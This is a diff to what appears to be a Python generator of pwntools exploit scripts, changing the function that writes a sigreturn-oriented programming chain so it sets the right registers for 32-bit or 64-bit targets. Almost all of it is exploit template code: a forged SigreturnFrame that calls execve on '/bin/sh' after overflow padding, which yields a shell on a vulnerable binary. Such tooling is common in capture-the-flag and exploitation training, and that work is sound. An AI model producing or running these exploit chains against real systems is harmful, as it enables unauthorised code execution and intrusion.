@@ -556,6 +556,13 @@ def _srop_chain(path: str, bits: int, arch: str, pop_rdi: int | None = None, ove
     """Sigreturn-oriented chain: one `syscall` gadget plus a forged sigcontext
     controls every register (rax/rdi/rsi/rdx/rip/...), so it works even when
     the binary has no gadgets beyond a bare `syscall; ret`."""
+    # execve's syscall-argument registers, per bit width - 32-bit Linux uses
+    # ebx/ecx/edx for argv1-3 rather than the 64-bit SysV rdi/rsi/rdx.
+    reg = (
+        {"acc": "rax", "arg1": "rdi", "arg2": "rsi", "arg3": "rdx", "pc": "rip"}
+        if bits == 64
+        else {"acc": "eax", "arg1": "ebx", "arg2": "ecx", "arg3": "edx", "pc": "eip"}
+    )
     return (
         f"{_common(path)}"
         f"from pwn import *\n\n"
@@ -573,12 +580,12 @@ def _srop_chain(path: str, bits: int, arch: str, pop_rdi: int | None = None, ove
         f"def exploit():\n"
         f"    io = conn()\n"
         f'    bin_sh = next(elf.search(b"/bin/sh\\\\x00"), None) or 0x0  # a writable "/bin/sh" - pivot to your own buffer if absent\n\n'
-        f'    frame = SigreturnFrame(arch=context.arch, kernel="amd64")\n'
-        f"    frame.rax = constants.SYS_execve\n"
-        f"    frame.rdi = bin_sh\n"
-        f"    frame.rsi = 0\n"
-        f"    frame.rdx = 0\n"
-        f"    frame.rip = SYSCALL\n\n"
+        f"    frame = SigreturnFrame(arch=context.arch)\n"
+        f"    frame.{reg['acc']} = constants.SYS_execve\n"
+        f"    frame.{reg['arg1']} = bin_sh\n"
+        f"    frame.{reg['arg2']} = 0\n"
+        f"    frame.{reg['arg3']} = 0\n"
+        f"    frame.{reg['pc']} = SYSCALL\n\n"
         f"    # the kernel requires rax == SYS_rt_sigreturn (15) at the moment `syscall` runs; either land here\n"
         f"    # where eax is already 15 from a prior syscall wrapper, or chain a `pop rax; ret` gadget first\n"
         f'    payload  = b"A" * OFFSET\n'
